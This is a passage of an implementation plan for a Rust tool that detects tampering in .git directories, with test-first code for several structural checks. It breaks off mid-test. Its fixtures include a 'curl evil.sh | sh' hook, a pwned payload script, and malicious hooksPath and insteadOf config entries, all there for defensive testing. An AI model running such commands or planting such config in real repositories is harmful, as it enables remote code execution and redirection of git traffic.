# GitSentinel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build `gitsentinel`, a Rust CLI that recursively finds every `.git` directory under a given path and reports structural anomalies (foreign files, broken naming conventions, bad permissions, suspicious config) that suggest tampering.

**Architecture:** `CLI (clap) -> discovery (recursive .git finder) -> checks (six independent per-repo structural checks) -> report (colored terminal output) -> exit code`. Checks are pure functions of a `.git` directory path that return `Vec<Finding>`; they share no mutable state and can be implemented/tested independently.

**Tech Stack:** Rust 2024 edition, `clap` (derive), `walkdir`, `flate2`, `colored`, `tempfile` (dev-dependency). Unix-only executable-bit detection (`std::os::unix::fs::PermissionsExt`); on non-unix targets `is_executable` always returns `false`.

Spec: `docs/superpowers/specs/2026-07-07-gitsentinel-design.md`

## Global Constraints

- Package name: `git-sentinel` (kebab-case). Binary name: `gitsentinel` (via explicit `[[bin]]`, `autobins = false`). Library target name (auto-derived by Cargo): `git_sentinel`.
- Severity model: `Info < Warning < Critical` (in that declared enum order, so `Ord`/`max()` picks the worst one correctly).
- Exit codes: `0` = no findings or INFO only; `1` = at least one WARNING and no CRITICAL; `2` = at least one CRITICAL.
- Non-goals for this plan (do not implement): JSON output, a known-hook-manager allowlist, commit/tree graph orphan-object analysis, deep blob content scanning.
- Every check function signature is `fn check_x(git_dir: &Path) -> Vec<Finding>` — pure, no I/O side effects beyond reading the filesystem.
- Executable-bit violations outside `hooks/` are reported **only** by `check_permissions` (a single global pass) — `check_objects` and `check_refs` do not duplicate that concern; they only validate naming/content.
- `hooks/` executable-bit judgments (custom hook vs sample) are reported **only** by `check_hooks` as WARNING; `check_permissions` explicitly skips anything under `hooks/`.

---

### Task 1: Project scaffold and core `Finding`/`Severity` types

**Files:**
- Create: `Cargo.toml`
- Create: `src/main.rs` (from `cargo init`, replaced with a placeholder in this task, fully wired in Task 12)
- Create: `src/lib.rs`
- Create: `src/model.rs`

**Interfaces:**
- Produces: `pub enum Severity { Info, Warning, Critical }` (derives `Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord`), `pub struct Finding { pub severity: Severity, pub category: &'static str, pub path: PathBuf, pub message: String }`, `impl Finding { pub fn new(severity: Severity, category: &'static str, path: impl Into<PathBuf>, message: impl Into<String>) -> Self }`, `pub fn worst_severity(findings: &[Finding]) -> Option<Severity>`. Every later task's checks build `Finding` values via `Finding::new`.

- [ ] **Step 1: Scaffold the cargo project**

Run:
```bash
cargo init --name git-sentinel
```
Expected: creates `Cargo.toml`, `src/main.rs`, and `.gitignore` (this directory is already a git repo with `docs/` committed, so `cargo init` will not re-run `git init`).

- [ ] **Step 2: Write `Cargo.toml`**

Replace the generated `Cargo.toml` with:

```toml
[package]
name = "git-sentinel"
version = "0.1.0"
edition = "2024"
autobins = false

[[bin]]
name = "gitsentinel"
path = "src/main.rs"

[dependencies]
clap = { version = "4", features = ["derive"] }
walkdir = "2"
flate2 = "1"
colored = "2"

[dev-dependencies]
tempfile = "3"
```

- [ ] **Step 3: Write the failing test in `src/model.rs`**

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Info,
    Warning,
    Critical,
}

use std::path::PathBuf;

#[derive(Debug, Clone)]
pub struct Finding {
    pub severity: Severity,
    pub category: &'static str,
    pub path: PathBuf,
    pub message: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn worst_severity_picks_highest() {
        let findings = vec![
            Finding::new(Severity::Info, "test", "a", "info msg"),
            Finding::new(Severity::Warning, "test", "b", "warn msg"),
        ];
        assert_eq!(worst_severity(&findings), Some(Severity::Warning));
    }

    #[test]
    fn worst_severity_empty_is_none() {
        assert_eq!(worst_severity(&[]), None);
    }
}
```

Note: this compiles the struct/enum definitions but intentionally omits `Finding::new` and `worst_severity` so the test step below fails on missing items, not on unrelated syntax.

- [ ] **Step 4: Create `src/lib.rs`**

```rust
pub mod model;
```

- [ ] **Step 5: Run test to verify it fails**

Run: `cargo test --lib`
Expected: compile error, `no function or associated item named 'new' found for struct 'Finding'` (and `cannot find function 'worst_severity'`).

- [ ] **Step 6: Add the missing implementation to `src/model.rs`**

Add above the `#[cfg(test)]` block:

```rust
impl Finding {
    pub fn new(
        severity: Severity,
        category: &'static str,
        path: impl Into<PathBuf>,
        message: impl Into<String>,
    ) -> Self {
        Finding {
            severity,
            category,
            path: path.into(),
            message: message.into(),
        }
    }
}

pub fn worst_severity(findings: &[Finding]) -> Option<Severity> {
    findings.iter().map(|f| f.severity).max()
}
```

- [ ] **Step 7: Run test to verify it passes**

Run: `cargo test --lib`
Expected: `test model::tests::worst_severity_picks_highest ... ok` and `test model::tests::worst_severity_empty_is_none ... ok`

- [ ] **Step 8: Replace `src/main.rs` placeholder**

```rust
fn main() {
    println!("gitsentinel: not yet wired up");
}
```

- [ ] **Step 9: Commit**

```bash
git add Cargo.toml Cargo.lock src/main.rs src/lib.rs src/model.rs .gitignore
git commit -m "Scaffold git-sentinel crate with Severity/Finding core types"
```

---

### Task 2: `is_executable` helper

**Files:**
- Create: `src/util.rs`
- Modify: `src/lib.rs`

**Interfaces:**
- Consumes: nothing (leaf module).
- Produces: `pub fn is_executable(path: &std::path::Path) -> bool`. Used by `check_root_files`, `check_hooks`, and `check_permissions` in later tasks.

- [ ] **Step 1: Write the failing test in `src/util.rs`**

```rust
use std::path::Path;

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use tempfile::tempdir;

    #[test]
    fn detects_non_executable_file() {
        let dir = tempdir().unwrap();
        let file_path = dir.path().join("plain.txt");
        fs::write(&file_path, b"hello").unwrap();
        fs::set_permissions(&file_path, fs::Permissions::from_mode(0o644)).unwrap();
        assert!(!is_executable(&file_path));
    }

    #[test]
    fn detects_executable_file() {
        let dir = tempdir().unwrap();
        let file_path = dir.path().join("script.sh");
        fs::write(&file_path, b"#!/bin/sh\necho hi\n").unwrap();
        fs::set_permissions(&file_path, fs::Permissions::from_mode(0o755)).unwrap();
        assert!(is_executable(&file_path));
    }
}
```

- [ ] **Step 2: Add `pub mod util;` to `src/lib.rs`**

`src/lib.rs` becomes:
```rust
pub mod model;
pub mod util;
```

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test --lib util::`
Expected: compile error, `cannot find function 'is_executable' in this scope`

- [ ] **Step 4: Implement `is_executable` in `src/util.rs`**

Add above the `#[cfg(test)]` block:

```rust
#[cfg(unix)]
pub fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    match std::fs::metadata(path) {
        Ok(meta) => meta.permissions().mode() & 0o111 != 0,
        Err(_) => false,
    }
}

#[cfg(not(unix))]
pub fn is_executable(_path: &Path) -> bool {
    false
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test --lib util::`
Expected: `test util::tests::detects_non_executable_file ... ok` and `test util::tests::detects_executable_file ... ok`

- [ ] **Step 6: Commit**

```bash
git add src/util.rs src/lib.rs
git commit -m "Add is_executable filesystem helper"
```

---

### Task 3: Discovery — recursive `.git` finder

**Files:**
- Create: `src/discovery.rs`
- Modify: `src/lib.rs`

**Interfaces:**
- Consumes: nothing beyond `std` and `walkdir`.
- Produces: `#[derive(Debug, Clone, PartialEq, Eq)] pub enum RepoEntry { GitDir(PathBuf), GitLink(PathBuf) }` and `pub fn discover_git_dirs(root: &Path) -> Vec<RepoEntry>`. `main.rs` (Task 12) matches on `RepoEntry` variants; `RepoEntry::GitDir`'s inner path is what every check function in Tasks 4-9 receives as `git_dir`.

- [ ] **Step 1: Write the failing test in `src/discovery.rs`**

```rust
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RepoEntry {
    GitDir(PathBuf),
    GitLink(PathBuf),
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    fn make_dir(base: &Path, rel: &str) {
        fs::create_dir_all(base.join(rel)).unwrap();
    }

    #[test]
    fn finds_git_dirs_and_gitlinks_but_skips_node_modules() {
        let dir = tempdir().unwrap();
        let root = dir.path();

        make_dir(root, "proj/.git");
        make_dir(root, "proj/vendor/lib/.git");
        make_dir(root, "proj/node_modules/pkg/.git");
        make_dir(root, "proj/sub");
        fs::write(root.join("proj/sub/.git"), b"gitdir: ../../.git/modules/sub\n").unwrap();

        let found = discover_git_dirs(root);

        let expected_git_dir_1 = root.join("proj/.git");
        let expected_git_dir_2 = root.join("proj/vendor/lib/.git");
        let expected_gitlink = root.join("proj/sub/.git");
        let node_modules_git = root.join("proj/node_modules/pkg/.git");

        assert_eq!(found.len(), 3, "expected exactly 3 entries, got {:?}", found);
        assert!(found.contains(&RepoEntry::GitDir(expected_git_dir_1)));
        assert!(found.contains(&RepoEntry::GitDir(expected_git_dir_2)));
        assert!(found.contains(&RepoEntry::GitLink(expected_gitlink)));
        assert!(!found.contains(&RepoEntry::GitDir(node_modules_git)));
    }
}
```

- [ ] **Step 2: Add `pub mod discovery;` to `src/lib.rs`**

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test --lib discovery::`
Expected: compile error, `cannot find function 'discover_git_dirs' in this scope`

- [ ] **Step 4: Implement `discover_git_dirs` in `src/discovery.rs`**

Add above the `#[cfg(test)]` block:

```rust
use walkdir::WalkDir;

const SKIP_DIRS: &[&str] = &["node_modules", "target", ".venv"];

pub fn discover_git_dirs(root: &Path) -> Vec<RepoEntry> {
    let mut results = Vec::new();
    let mut it = WalkDir::new(root).into_iter();

    while let Some(entry) = it.next() {
        let entry = match entry {
            Ok(e) => e,
            Err(_) => continue,
        };
        let file_name = entry.file_name().to_string_lossy().to_string();

        if entry.file_type().is_dir() {
            if file_name == ".git" {
                results.push(RepoEntry::GitDir(entry.path().to_path_buf()));
                it.skip_current_dir();
                continue;
            }
            if SKIP_DIRS.contains(&file_name.as_str()) {
                it.skip_current_dir();
                continue;
            }
        } else if entry.file_type().is_file() && file_name == ".git" {
            results.push(RepoEntry::GitLink(entry.path().to_path_buf()));
        }
    }

    results
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test --lib discovery::`
Expected: `test discovery::tests::finds_git_dirs_and_gitlinks_but_skips_node_modules ... ok`

- [ ] **Step 6: Commit**

```bash
git add src/discovery.rs src/lib.rs
git commit -m "Add recursive .git discovery, skipping node_modules/target/.venv"
```

---

### Task 4: `check_root_files`

**Files:**
- Create: `src/checks/root_files.rs`
- Create: `src/checks/mod.rs` (with only `mod root_files;` for now — extended in later tasks)
- Modify: `src/lib.rs`

**Interfaces:**
- Consumes: `crate::model::{Finding, Severity}`, `crate::util::is_executable`.
- Produces: `pub fn check_root_files(git_dir: &Path) -> Vec<Finding>`. Called from `checks::run_all_checks` in Task 10.

- [ ] **Step 1: Write the failing tests in `src/checks/root_files.rs`**

```rust
use crate::model::{Finding, Severity};
use crate::util::is_executable;
use std::path::Path;

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use tempfile::tempdir;

    #[test]
    fn clean_git_dir_has_no_findings() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::write(git_dir.join("HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(git_dir.join("config"), "").unwrap();
        fs::create_dir(git_dir.join("objects")).unwrap();
        fs::create_dir(git_dir.join("refs")).unwrap();

        let findings = check_root_files(git_dir);
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }

    #[test]
    fn unknown_benign_file_is_warning() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::write(git_dir.join("notes.txt"), "todo").unwrap();

        let findings = check_root_files(git_dir);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Warning);
    }

    #[test]
    fn unknown_executable_file_is_critical() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        let payload = git_dir.join("payload.sh");
        fs::write(&payload, "#!/bin/sh\necho pwned\n").unwrap();
        fs::set_permissions(&payload, fs::Permissions::from_mode(0o755)).unwrap();

        let findings = check_root_files(git_dir);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }
}
```

- [ ] **Step 2: Create `src/checks/mod.rs`**

```rust
mod root_files;
```

- [ ] **Step 3: Add `pub mod checks;` to `src/lib.rs`**

- [ ] **Step 4: Run test to verify it fails**

Run: `cargo test --lib checks::root_files::`
Expected: compile error, `cannot find function 'check_root_files' in this scope`

- [ ] **Step 5: Implement `check_root_files` in `src/checks/root_files.rs`**

Add above the `#[cfg(test)]` block:

```rust
const KNOWN_ENTRIES: &[&str] = &[
    "HEAD", "config", "description", "index", "packed-refs",
    "info", "hooks", "objects", "refs", "logs",
    "COMMIT_EDITMSG", "FETCH_HEAD", "ORIG_HEAD",
    "MERGE_HEAD", "MERGE_MSG", "MERGE_MODE",
    "shallow", "modules", "worktrees", "branches",
];

const SUSPICIOUS_EXTENSIONS: &[&str] = &[
    "exe", "sh", "py", "dll", "ps1", "bin", "bat", "jar",
];

fn has_suspicious_extension(path: &Path) -> bool {
    path.extension()
        .and_then(|e| e.to_str())
        .map(|e| SUSPICIOUS_EXTENSIONS.contains(&e.to_lowercase().as_str()))
        .unwrap_or(false)
}

pub fn check_root_files(git_dir: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let entries = match std::fs::read_dir(git_dir) {
        Ok(entries) => entries,
        Err(_) => return findings,
    };

    for entry in entries.flatten() {
        let name = entry.file_name();
        let name_str = name.to_string_lossy();
        if KNOWN_ENTRIES.contains(&name_str.as_ref()) {
            continue;
        }
        let path = entry.path();
        let executable = is_executable(&path);
        let suspicious = has_suspicious_extension(&path);

        if executable || suspicious {
            findings.push(Finding::new(
                Severity::Critical,
                "root_files",
                path,
                format!(
                    "unexpected {} entry '{}' in .git root",
                    if executable { "executable" } else { "suspicious" },
                    name_str
                ),
            ));
        } else {
            findings.push(Finding::new(
                Severity::Warning,
                "root_files",
                path,
                format!("unknown entry '{}' in .git root, review manually", name_str),
            ));
        }
    }
    findings
}
```

- [ ] **Step 6: Run test to verify it passes**

Run: `cargo test --lib checks::root_files::`
Expected: all three tests `... ok`

- [ ] **Step 7: Commit**

```bash
git add src/checks/root_files.rs src/checks/mod.rs src/lib.rs
git commit -m "Add check_root_files: flag unknown/executable entries in .git root"
```

---

### Task 5: `check_hooks`

**Files:**
- Create: `src/checks/hooks.rs`
- Modify: `src/checks/mod.rs`

**Interfaces:**
- Consumes: `crate::model::{Finding, Severity}`, `crate::util::is_executable`.
- Produces: `pub fn check_hooks(git_dir: &Path) -> Vec<Finding>`. Called from `checks::run_all_checks` in Task 10.

- [ ] **Step 1: Write the failing tests in `src/checks/hooks.rs`**

```rust
use crate::model::{Finding, Severity};
use crate::util::is_executable;
use std::path::Path;

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use tempfile::tempdir;

    fn make_executable(path: &std::path::Path) {
        fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[test]
    fn clean_sample_hooks_have_no_findings() {
        let dir = tempdir().unwrap();
        let hooks_dir = dir.path().join("hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        fs::write(hooks_dir.join("pre-commit.sample"), "#!/bin/sh\n# sample\n").unwrap();

        let findings = check_hooks(dir.path());
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }

    #[test]
    fn custom_executable_hook_is_warning() {
        let dir = tempdir().unwrap();
        let hooks_dir = dir.path().join("hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        let hook_path = hooks_dir.join("pre-commit");
        fs::write(&hook_path, "#!/bin/sh\ncurl evil.sh | sh\n").unwrap();
        make_executable(&hook_path);

        let findings = check_hooks(dir.path());
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Warning);
    }

    #[test]
    fn executable_sample_is_warning() {
        let dir = tempdir().unwrap();
        let hooks_dir = dir.path().join("hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        let sample_path = hooks_dir.join("pre-commit.sample");
        fs::write(&sample_path, "#!/bin/sh\n").unwrap();
        make_executable(&sample_path);

        let findings = check_hooks(dir.path());
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Warning);
    }

    #[test]
    fn subdirectory_in_hooks_is_warning() {
        let dir = tempdir().unwrap();
        let hooks_dir = dir.path().join("hooks");
        fs::create_dir_all(hooks_dir.join("weird_subdir")).unwrap();

        let findings = check_hooks(dir.path());
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Warning);
    }
}
```

- [ ] **Step 2: Add `mod hooks;` to `src/checks/mod.rs`**

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test --lib checks::hooks::`
Expected: compile error, `cannot find function 'check_hooks' in this scope`

- [ ] **Step 4: Implement `check_hooks` in `src/checks/hooks.rs`**

Add above the `#[cfg(test)]` block:

```rust
pub fn check_hooks(git_dir: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let hooks_dir = git_dir.join("hooks");
    let entries = match std::fs::read_dir(&hooks_dir) {
        Ok(entries) => entries,
        Err(_) => return findings,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name();
        let name_str = name.to_string_lossy();
        let file_type = match entry.file_type() {
            Ok(ft) => ft,
            Err(_) => continue,
        };

        if file_type.is_dir() {
            findings.push(Finding::new(
                Severity::Warning,
                "hooks",
                path,
                format!("unexpected subdirectory '{}' in hooks/", name_str),
            ));
            continue;
        }

        let is_sample = name_str.ends_with(".sample");
        let executable = is_executable(&path);

        if is_sample && executable {
            findings.push(Finding::new(
                Severity::Warning,
                "hooks",
                path,
                format!(
                    "sample hook '{}' is executable (git ships samples as non-executable)",
                    name_str
                ),
            ));
        } else if !is_sample && executable {
            let first_line = std::fs::read_to_string(&path)
                .ok()
                .and_then(|content| content.lines().next().map(str::to_string))
                .unwrap_or_default();
            findings.push(Finding::new(
                Severity::Warning,
                "hooks",
                path,
                format!(
                    "custom executable hook '{}' (not .sample), first line: {}",
                    name_str, first_line
                ),
            ));
        }
    }
    findings
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test --lib checks::hooks::`
Expected: all four tests `... ok`

- [ ] **Step 6: Commit**

```bash
git add src/checks/hooks.rs src/checks/mod.rs
git commit -m "Add check_hooks: flag custom executable hooks and executable samples"
```

---

### Task 6: `check_config`

**Files:**
- Create: `src/checks/config.rs`
- Modify: `src/checks/mod.rs`

**Interfaces:**
- Consumes: `crate::model::{Finding, Severity}`.
- Produces: `pub fn check_config(git_dir: &Path) -> Vec<Finding>`. Called from `checks::run_all_checks` in Task 10.

- [ ] **Step 1: Write the failing tests in `src/checks/config.rs`**

```rust
use crate::model::{Finding, Severity};
use std::path::Path;

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn clean_config_has_no_findings() {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("config"),
            "[core]\n\trepositoryformatversion = 0\n\tbare = false\n",
        )
        .unwrap();

        let findings = check_config(dir.path());
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }

    #[test]
    fn core_hooks_path_is_warning() {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("config"),
            "[core]\n\thooksPath = /tmp/evil-hooks\n",
        )
        .unwrap();

        let findings = check_config(dir.path());
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Warning);
        assert!(findings[0].message.contains("hooksPath"));
    }

    #[test]
    fn url_insteadof_is_warning() {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("config"),
            "[url \"https://evil.example/\"]\n\tinsteadOf = https://github.com/\n",
        )
        .unwrap();

        let findings = check_config(dir.path());
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Warning);
        assert!(findings[0].message.contains("insteadOf"));
    }
}
```

- [ ] **Step 2: Add `mod config;` to `src/checks/mod.rs`**

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test --lib checks::config::`
Expected: compile error, `cannot find function 'check_config' in this scope`

- [ ] **Step 4: Implement `check_config` in `src/checks/config.rs`**

Add above the `#[cfg(test)]` block:

```rust
pub fn check_config(git_dir: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let config_path = git_dir.join("config");
    let content = match std::fs::read_to_string(&config_path) {
        Ok(c) => c,
        Err(_) => return findings,
    };

    let mut section = String::new();
    let mut subsection = String::new();

    for raw_line in content.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }

        if line.starts_with('[') && line.ends_with(']') {
            let inner = &line[1..line.len() - 1];
            if let Some(space_idx) = inner.find(char::is_whitespace) {
                section = inner[..space_idx].to_lowercase();
                subsection = inner[space_idx..].trim().trim_matches('"').to_string();
            } else {
                section = inner.to_lowercase();
                subsection.clear();
            }
            continue;
        }

        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim().to_lowercase();
        let value = value.trim();

        let flagged = match (section.as_str(), key.as_str()) {
            ("core", "hookspath") => Some(format!(
                "core.hooksPath = {value} (hooks run from outside the standard hooks/ directory)"
            )),
            ("core", "fsmonitor") => Some(format!(
                "core.fsmonitor = {value} (runs an external command on git operations)"
            )),
            (s, "path") if s == "include" || s.starts_with("includeif") => {
                Some(format!("{section}.path = {value} (loads config from another file)"))
            }
            ("url", "insteadof") => Some(format!(
                "url \"{subsection}\".insteadOf = {value} (silently redirects git operations to a different URL)"
            )),
            _ => None,
        };

        if let Some(message) = flagged {
            findings.push(Finding::new(Severity::Warning, "config", config_path.clone(), message));
        }
    }

    findings
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test --lib checks::config::`
Expected: all three tests `... ok`

- [ ] **Step 6: Commit**

```bash
git add src/checks/config.rs src/checks/mod.rs
git commit -m "Add check_config: flag hooksPath/fsmonitor/insteadOf/include directives"
```

---

### Task 7: `check_objects`

**Files:**
- Create: `src/checks/objects.rs`
- Modify: `src/checks/mod.rs`

**Interfaces:**
- Consumes: `crate::model::{Finding, Severity}`, `flate2::read::ZlibDecoder`.
- Produces: `pub fn check_objects(git_dir: &Path) -> Vec<Finding>`. Called from `checks::run_all_checks` in Task 10. Does **not** check the executable bit (that is `check_permissions`'s job — see Global Constraints).

- [ ] **Step 1: Write the failing tests in `src/checks/objects.rs`**

```rust
use crate::model::{Finding, Severity};
use std::io::Read;
use std::path::Path;

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::write::ZlibEncoder;
    use flate2::Compression;
    use std::fs;
    use std::io::Write;
    use tempfile::tempdir;

    fn make_valid_object_bytes() -> Vec<u8> {
        let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(b"blob 5\0hello").unwrap();
        encoder.finish().unwrap()
    }

    #[test]
    fn valid_loose_object_has_no_findings() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        let obj_dir = git_dir.join("objects/ab");
        fs::create_dir_all(&obj_dir).unwrap();
        let name = "c".repeat(38);
        fs::write(obj_dir.join(&name), make_valid_object_bytes()).unwrap();

        let findings = check_objects(git_dir);
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }

    #[test]
    fn bad_filename_length_is_critical() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        let obj_dir = git_dir.join("objects/ab");
        fs::create_dir_all(&obj_dir).unwrap();
        fs::write(obj_dir.join("tooshort"), make_valid_object_bytes()).unwrap();

        let findings = check_objects(git_dir);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn invalid_zlib_content_is_critical() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        let obj_dir = git_dir.join("objects/ab");
        fs::create_dir_all(&obj_dir).unwrap();
        let name = "d".repeat(38);
        fs::write(obj_dir.join(&name), b"not a zlib stream at all garbage bytes").unwrap();

        let findings = check_objects(git_dir);
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn unexpected_file_in_pack_dir_is_critical() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        let pack_dir = git_dir.join("objects/pack");
        fs::create_dir_all(&pack_dir).unwrap();
        fs::write(pack_dir.join("payload.sh"), "#!/bin/sh\n").unwrap();

        let findings = check_objects(git_dir);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn unexpected_entry_directly_under_objects_is_critical() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::create_dir_all(git_dir.join("objects")).unwrap();
        fs::write(git_dir.join("objects/notes.txt"), "hi").unwrap();

        let findings = check_objects(git_dir);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }
}
```

- [ ] **Step 2: Add `mod objects;` to `src/checks/mod.rs`**

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test --lib checks::objects::`
Expected: compile error, `cannot find function 'check_objects' in this scope`

- [ ] **Step 4: Implement `check_objects` in `src/checks/objects.rs`**

Add above the `#[cfg(test)]` block:

```rust
fn is_hex(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
}

fn is_valid_zlib_stream(path: &Path) -> bool {
    let file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(_) => return false,
    };
    let mut decoder = flate2::read::ZlibDecoder::new(file);
    let mut buf = [0u8; 16];
    decoder.read(&mut buf).is_ok()
}

pub fn check_objects(git_dir: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let objects_dir = git_dir.join("objects");
    let top_entries = match std::fs::read_dir(&objects_dir) {
        Ok(entries) => entries,
        Err(_) => return findings,
    };

    for top_entry in top_entries.flatten() {
        let top_name = top_entry.file_name().to_string_lossy().to_string();
        let top_path = top_entry.path();

        if top_name == "info" {
            continue;
        }
        if top_name == "pack" {
            check_pack_dir(&top_path, &mut findings);
            continue;
        }
        if top_entry.file_type().map(|ft| ft.is_dir()).unwrap_or(false)
            && top_name.len() == 2
            && is_hex(&top_name)
        {
            check_loose_object_dir(&top_path, &mut findings);
            continue;
        }

        findings.push(Finding::new(
            Severity::Critical,
            "objects",
            top_path,
            format!("unexpected entry '{}' directly under objects/", top_name),
        ));
    }

    findings
}

fn check_loose_object_dir(dir: &Path, findings: &mut Vec<Finding>) {
    let entries = match std::fs::read_dir(dir) {
        Ok(entries) => entries,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().to_string();

        if (name.len() != 38 && name.len() != 62) || !is_hex(&name) {
            findings.push(Finding::new(
                Severity::Critical,
                "objects",
                path,
                format!("loose object filename '{}' is not a valid hex object id", name),
            ));
            continue;
        }

        if !is_valid_zlib_stream(&path) {
            findings.push(Finding::new(
                Severity::Critical,
                "objects",
                path,
                "loose object file is not a valid zlib stream".to_string(),
            ));
        }
    }
}

fn check_pack_dir(dir: &Path, findings: &mut Vec<Finding>) {
    let entries = match std::fs::read_dir(dir) {
        Ok(entries) => entries,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().to_string();
        let allowed = name.ends_with(".pack") || name.ends_with(".idx") || name.ends_with(".rev");
        if !allowed {
            findings.push(Finding::new(
                Severity::Critical,
                "objects",
                path,
                format!("unexpected file '{}' in objects/pack/", name),
            ));
        }
    }
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test --lib checks::objects::`
Expected: all five tests `... ok`

- [ ] **Step 6: Commit**

```bash
git add src/checks/objects.rs src/checks/mod.rs
git commit -m "Add check_objects: validate loose object naming, zlib streams, pack contents"
```

---

### Task 8: `check_refs`

**Files:**
- Create: `src/checks/refs.rs`
- Modify: `src/checks/mod.rs`

**Interfaces:**
- Consumes: `crate::model::{Finding, Severity}`, `walkdir::WalkDir`.
- Produces: `pub fn check_refs(git_dir: &Path) -> Vec<Finding>`. Called from `checks::run_all_checks` in Task 10. Does **not** check the executable bit (see Global Constraints).

- [ ] **Step 1: Write the failing tests in `src/checks/refs.rs`**

```rust
use crate::model::{Finding, Severity};
use std::path::Path;
use walkdir::WalkDir;

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn valid_branch_ref_has_no_findings() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::create_dir_all(git_dir.join("refs/heads")).unwrap();
        fs::write(git_dir.join("refs/heads/main"), format!("{}\n", "a".repeat(40))).unwrap();

        let findings = check_refs(git_dir);
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }

    #[test]
    fn malformed_ref_content_is_critical() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::create_dir_all(git_dir.join("refs/heads")).unwrap();
        fs::write(git_dir.join("refs/heads/main"), "not-a-sha\n").unwrap();

        let findings = check_refs(git_dir);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn valid_packed_refs_has_no_findings() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        let content = format!("{} refs/heads/main\n", "c".repeat(40));
        fs::write(git_dir.join("packed-refs"), content).unwrap();

        let findings = check_refs(git_dir);
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }

    #[test]
    fn malformed_packed_refs_line_is_critical() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::write(git_dir.join("packed-refs"), "garbage line here\n").unwrap();

